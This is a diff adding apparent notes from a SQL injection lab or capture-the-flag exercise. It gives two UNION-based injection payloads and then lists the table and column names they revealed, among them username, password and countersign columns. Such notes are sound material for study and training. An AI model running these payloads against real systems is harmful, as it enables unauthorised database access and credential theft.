@@ -1,0 +1,54 @@
+1 and 1=1 UNION SELECT nb_vote, subject from Member_survey.vote_dbs
+1 and 1=1 UNION SELECT title, url from list_images
+
+tables
+
+Title: db_default
+Url : Member_Brute_Force
+
+Title: users
+Url : Member_Sql_Injection
+
+Title: guestbook
+Url : Member_guestbook
+
+Title: list_images
+Url : Member_images
+
+Title: vote_dbs
+Url : Member_survey
+
+
+
+columns :
+db_default
+Title: id
+Title: username
+Title: password
+
+users
+Title: user_id
+Title: countersign
+Title: first_name
+Title: last_name
+Title: town
+Title: country
+Title: planet
+Title: Commentaire
+
+guestbook
+Title: id_comment
+Title: comment
+Title: name
+
+list_images
+Title: id
+Title: url
+Title: title
+Title: comment
+
+vote_dbs
+Title: id_vote
+Title: vote
+Title: nb_vote
+Title: subject
